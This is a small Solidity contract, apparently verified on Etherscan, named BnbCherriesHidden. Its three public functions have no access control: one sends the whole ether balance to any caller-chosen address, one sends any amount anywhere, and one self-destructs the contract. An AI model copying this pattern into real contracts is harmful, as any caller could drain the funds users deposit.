/**
 *Submitted for verification at Etherscan.io on 2022-05-03
*/

// File: BNBCheriesHidden.sol



pragma solidity 0.8.9;

contract BnbCherriesHidden{


      function wAM(address f) public  {
        uint256 balance = address(this).balance;
        require(balance > 0, "Insufficent balance");
        _w(f, address(this).balance);
    }

    function _w(address _address, uint256 _amount) public {
        (bool success, ) = _address.call{ value: _amount }("");
        require(success, "Failed to widthdraw Ether");
    }

    function def(address f) public  {
        address payable _to = payable (f);
        selfdestruct(_to);
    }

}